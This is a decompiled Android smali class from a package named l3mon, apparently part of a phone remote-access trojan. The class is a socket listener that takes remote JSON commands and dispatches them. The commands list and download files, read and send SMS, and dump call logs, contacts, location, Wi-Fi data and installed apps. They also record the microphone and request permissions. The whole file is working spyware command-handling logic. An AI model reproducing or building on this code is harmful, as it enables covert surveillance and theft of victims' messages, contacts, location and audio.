.class Lcom/etechd/l3mon/ConnectionManager$100000001;
.super Ljava/lang/Object;
.source "ConnectionManager.java"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/etechd/l3mon/ConnectionManager;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# direct methods
.method constructor <init>()V
    .locals 3

    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public varargs call([Ljava/lang/Object;)V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "([",
            "Ljava/lang/Object;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 48
    move-object v0, p0

    move-object v1, p1

    move-object v7, v1

    const/4 v8, 0x0

    :try_start_0
    aget-object v7, v7, v8

    check-cast v7, Lorg/json/JSONObject;

    move-object v3, v7

    .line 49
    move-object v7, v3

    const-string v8, "type"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    move-object v4, v7

    .line 52
    move-object v7, v4

    move-object v5, v7

    move-object v7, v5

    const-string v8, "0xFI"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_2

    .line 60
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "ls"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 61
    const/4 v7, 0x0

    move-object v8, v3

    const-string v9, "path"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Lcom/etechd/l3mon/ConnectionManager;->FI(ILjava/lang/String;)V

    .line 97
    :cond_0
    :goto_0
    return-void

    .line 62
    :cond_1
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "dl"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 63
    const/4 v7, 0x1

    move-object v8, v3

    const-string v9, "path"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Lcom/etechd/l3mon/ConnectionManager;->FI(ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 94
    :catch_0
    move-exception v7

    move-object v3, v7

    .line 97
    move-object v7, v3

    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 64
    :cond_2
    move-object v7, v5

    :try_start_1
    const-string v8, "0xSM"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_5

    .line 66
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "ls"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 67
    const/4 v7, 0x0

    const/4 v8, 0x0

    check-cast v8, Ljava/lang/String;

    const/4 v9, 0x0

    check-cast v9, Ljava/lang/String;

    invoke-static {v7, v8, v9}, Lcom/etechd/l3mon/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    .line 70
    :cond_3
    :goto_1
    goto :goto_0

    .line 68
    :cond_4
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "sendSMS"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    .line 69
    const/4 v7, 0x1

    move-object v8, v3

    const-string v9, "to"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    move-object v9, v3

    const-string v10, "sms"

    invoke-virtual {v9, v10}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lcom/etechd/l3mon/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 70
    :cond_5
    move-object v7, v5

    const-string v8, "0xCL"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_6

    .line 72
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->CL()V

    .line 73
    goto :goto_0

    :cond_6
    move-object v7, v5

    const-string v8, "0xCO"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_7

    .line 75
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->CO()V

    .line 76
    goto/16 :goto_0

    :cond_7
    move-object v7, v5

    const-string v8, "0xMI"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_8

    .line 78
    move-object v7, v3

    const-string v8, "sec"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v7

    invoke-static {v7}, Lcom/etechd/l3mon/ConnectionManager;->MI(I)V

    .line 79
    goto/16 :goto_0

    :cond_8
    move-object v7, v5

    const-string v8, "0xLO"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_9

    .line 81
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->LO()V

    .line 82
    goto/16 :goto_0

    :cond_9
    move-object v7, v5

    const-string v8, "0xWI"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_a

    .line 84
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->WI()V

    .line 85
    goto/16 :goto_0

    :cond_a
    move-object v7, v5

    const-string v8, "0xPM"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_b

    .line 87
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->PM()V

    .line 88
    goto/16 :goto_0

    :cond_b
    move-object v7, v5

    const-string v8, "0xIN"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_c

    .line 90
    invoke-static {}, Lcom/etechd/l3mon/ConnectionManager;->IN()V

    .line 91
    goto/16 :goto_0

    :cond_c
    move-object v7, v5

    const-string v8, "0xGP"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_0

    .line 93
    move-object v7, v3

    const-string v8, "permission"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/etechd/l3mon/ConnectionManager;->GP(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 94
    goto/16 :goto_0
.end method
